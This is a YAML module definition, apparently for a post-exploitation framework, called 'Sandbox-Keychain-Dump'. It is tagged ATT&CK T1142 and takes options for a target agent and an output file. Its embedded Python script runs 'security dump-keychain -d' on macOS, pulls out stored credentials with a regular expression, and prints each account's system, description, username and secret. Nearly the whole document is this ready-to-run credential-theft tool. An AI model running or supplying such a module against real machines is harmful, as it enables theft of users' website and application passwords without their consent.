name: Sandbox-Keychain-Dump
authors:
  - name: ''
    handle: '@import-au'
    link: ''
description: |
  Extracts passwords from the macOS Keychain using the native
  security command-line utility. Leverages the 'security dump-keychain'
  command to retrieve keychain contents and parses the output to
  extract account information, descriptions, usernames, and secrets.
  Triggers user prompts for keychain access on each key, requiring
  user interaction for successful extraction. Compatible with
  sandboxed environments but may trigger security prompts on
  newer macOS versions (Sierra and later). Provides credential
  extraction capabilities for website passwords, application
  passwords, and other stored credentials in the user's keychain.
software: ''
tactics: []
techniques:
  - T1142
background: false
output_extension: ''
needs_admin: false
opsec_safe: false
language: python
min_language_version: '2.6'
comments:
  - ''
options:
  - name: Agent
    description: Agent to execute module on.
    required: true
    value: ''
  - name: OutFile
    description: File to output AppleScript to, otherwise displayed on the screen.
    required: false
    value: ''
script: |-
  import subprocess
  import re

  process = subprocess.Popen('/usr/bin/security dump-keychain -d', stdout=subprocess.PIPE, shell=True)
  keychain = process.communicate()
  find_account = re.compile('0x00000007\s\<blob\>\=\"([^\"]+)\"\n.*\n.*\"acct\"\<blob\>\=\"([^\"]+)\"\n.*\n.*\n.*\n\s+\"desc\"\<blob\>\=([^\n]+)\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\ndata\:\n([^\n]+)')
  accounts = find_account.findall(keychain[0])
  for account in accounts:
      print("System: " + account[0])
      print("Description: " + account[2])
      print("Username: " + account[1])
      print("Secret: " + account[3])
